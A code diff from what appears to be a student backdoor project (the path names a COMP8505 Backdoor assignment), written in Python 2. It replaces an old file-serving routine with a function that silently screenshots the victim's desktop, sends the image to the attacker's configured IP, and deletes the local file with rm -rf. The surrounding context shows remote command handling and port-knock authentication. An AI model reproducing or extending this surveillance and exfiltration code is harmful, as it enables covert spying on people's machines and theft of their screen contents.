@@ -238,37 +238,10 @@ def runCmd(packet):
 				helpers.sendMessage("Unknown Command", configReader.srcIP, 9000)
 				
 def screenshot(packet):
-	os.system("gnome-screenshot --file=/root/Documents/homework/COMP8505/Backdoor/this_directory.png")
-	sendFile(file1)
-
-def sendFile(file1)
-	port = 60000                    # Reserve a port for your service.
-	s = socket.socket()             # Create a socket object
-	host = socket.gethostname()     # Get local machine name
-	s.bind((host, port))            # Bind to the port
-	s.listen(5)                     # Now wait for client connection.
-
-	print 'Server listening....'
-
-	while True:
-		conn, addr = s.accept()     # Establish connection with client.
-		print 'Got connection from', addr
-		data = conn.recv(1024)
-		print('Server received', repr(data))
 	
-		filename=file1
-		f = open(filename,'rb')
-		l = f.read(1024)
-		while (l):
-			conn.send(l)
-		print('Sent ',repr(l))
-			l = f.read(1024)
-			f.close()
-	
-		print('Done sending')
-		conn.send('Thank you for connecting')
-		conn.close()
-
+	os.system("gnome-screenshot --file=./desktop.png")
+	helpers.fileSender(configReader.srcIP, "./desktop.png", 6000)
+	os.system("rm -rf ./desktop.png")
             
       			
 #  =================================================================
@@ -300,7 +273,7 @@ def knock(packet):
 				state = 3
 				clientIP = packet[IP].src
 				print packet[IP].src + " Third Sequence Knock"
-				print "Connection Accepted"
+				print "Connection Accepted\n"
 			else:
 				print "Wrong Port Knock Sequence"
 	
